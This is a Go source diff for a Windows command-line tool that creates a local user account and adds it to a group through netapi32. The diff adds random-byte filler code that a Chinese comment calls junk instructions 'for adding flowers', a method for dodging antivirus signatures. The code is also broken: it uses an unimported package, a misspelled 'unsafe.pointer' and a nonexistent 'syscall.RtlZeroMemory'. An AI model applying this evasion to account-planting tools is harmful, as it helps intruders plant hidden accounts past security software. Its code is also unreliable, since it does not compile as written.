@@ -5,8 +5,8 @@ import (
 	"os"
 	"syscall"
 	"unsafe"
+	"math/rand"
 )
-
 var (
 	modnetapi32 = syscall.NewLazyDLL("netapi32.dll")
 
@@ -66,7 +66,15 @@ func main() {
 		fmt.Println("用法: CreateUser.exe 用户名 密码")
 		return
 	}
-
+    // 无效命令用于加花
+	rand.Seed(time.Now().UnixNano())
+	//分配内存
+	mem := make([]byte, 1024)
+	// 遍历内存区域，写入随机数
+	for i := 0; i < len(mem); i++ {
+		mem[i] = byte(rand.Intn(256))
+    }
+	//读取命令行
 	username := syscall.StringToUTF16Ptr(os.Args[1])
 	password := syscall.StringToUTF16Ptr(os.Args[2])
 
@@ -80,6 +88,9 @@ func main() {
 	ret := NetUserAdd(nil, 1, (*byte)(unsafe.Pointer(&ui1)), nil)
 	if ret != ERROR_SUCCESS {
 		fmt.Println("添加用户错误:", ret)
+		//释放内存
+		syscall.RtlZeroMemory(unsafe.Pointer(&ui1), unsafe.Sizeof(ui1))
+		_ = unsafe.pointer(&mem)
 		return
 	}
 
@@ -90,8 +101,16 @@ func main() {
 	ret = NetLocalGroupAddMembers(nil, groupName, 3, (*byte)(unsafe.Pointer(buf)), 1)
 	if ret != ERROR_SUCCESS && ret != NERR_GroupNotFound {
 		fmt.Println("添加用户到组失败:", ret)
+		
+		//释放内存
+		syscall.RtlZeroMemory(unsafe.Pointer(&ui1), unsafe.Sizeof(ui1))
+		_ = unsafe.pointer(&mem)
 		return
 	}
 
 	fmt.Println("添加用户和组成功.")
+	//释放内存
+	syscall.RtlZeroMemory(unsafe.Pointer(&ui1), unsafe.Sizeof(ui1))
+	_ = unsafe.pointer(&mem)
+	return
 }
